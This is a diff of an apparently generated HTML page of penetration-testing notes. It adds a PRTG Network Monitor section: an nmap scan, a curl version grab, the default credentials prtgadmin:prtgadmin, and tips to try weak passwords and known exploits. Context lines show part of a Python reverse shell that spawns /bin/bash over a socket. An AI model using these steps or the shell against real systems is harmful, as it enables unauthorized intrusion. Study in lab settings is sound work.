@@ -1283,6 +1283,30 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#prtg-network-monitor" class="md-nav__link">
+    <span class="md-ellipsis">
+      PRTG Network Monitor
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PRTG Network Monitor">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discoveryfootprintingenumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovery/Footprinting/Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1905,6 +1929,30 @@
         
       </ul>
     </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prtg-network-monitor" class="md-nav__link">
+    <span class="md-ellipsis">
+      PRTG Network Monitor
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PRTG Network Monitor">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discoveryfootprintingenumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovery/Footprinting/Enumeration
+    </span>
+  </a>
   
 </li>
         
@@ -2693,6 +2741,20 @@
 </span><span id="__span-54-7"><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)]</span>
 </span><span id="__span-54-8"><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
 </span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h2 id="prtg-network-monitor">PRTG Network Monitor</h2>
+<h3 id="discoveryfootprintingenumeration">Discovery/Footprinting/Enumeration</h3>
+<ul>
+<li>An nmap scan can reveal PRTG, usually on common web ports (80, 443, 8080)
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-55-1">sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-T4<span class="w"> </span><span class="m">10</span>.129.176.144
+</span></code></pre></div></td></tr></table></div></li>
+<li>Can show up in Eyewitness scan</li>
+<li>These scans can reveal version number (which can be searched for exploits) or use curl
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-56-1">curl<span class="w"> </span>-s<span class="w"> </span>http://10.129.201.50:8080/index.htm<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>version
+</span></code></pre></div></td></tr></table></div></li>
+<li>Default creds <code>prtgadmin:prtgadmin</code></li>
+<li>Try weak passwords for <code>prtgadmin</code></li>
+<li>Try know exploits for version</li>
 </ul>
 
 
